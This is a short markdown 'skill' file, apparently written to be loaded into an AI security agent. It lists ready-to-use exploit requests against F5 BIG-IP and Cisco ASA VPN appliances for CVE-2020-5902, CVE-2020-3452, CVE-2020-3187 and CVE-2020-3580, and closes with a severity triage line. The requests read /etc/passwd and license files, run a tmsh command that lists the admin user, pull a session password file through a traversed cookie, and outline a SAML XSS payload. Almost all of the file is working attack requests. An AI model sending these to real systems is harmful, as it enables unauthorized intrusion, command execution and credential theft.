# SKILL: bigip-cisco-vpn
## F5 LFI (CVE-2020-5902)
https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
## F5 RCE
https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
## Cisco path traversal (CVE-2020-3452)
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
## Cisco session password (CVE-2020-3187)
curl -k -H "Cookie: token=../+CSCOU+/login-header-icon.jpg" https://vpn.target.com/+CSCOE+/session_password.html
## Cisco SAML XSS (CVE-2020-3580)
/+CSCOE+/saml/sp/acs?tgname=a with SAMLResponse containing svg/onload
## Triage
RCE → Critical. LFI → High. SAML XSS → Med/High.
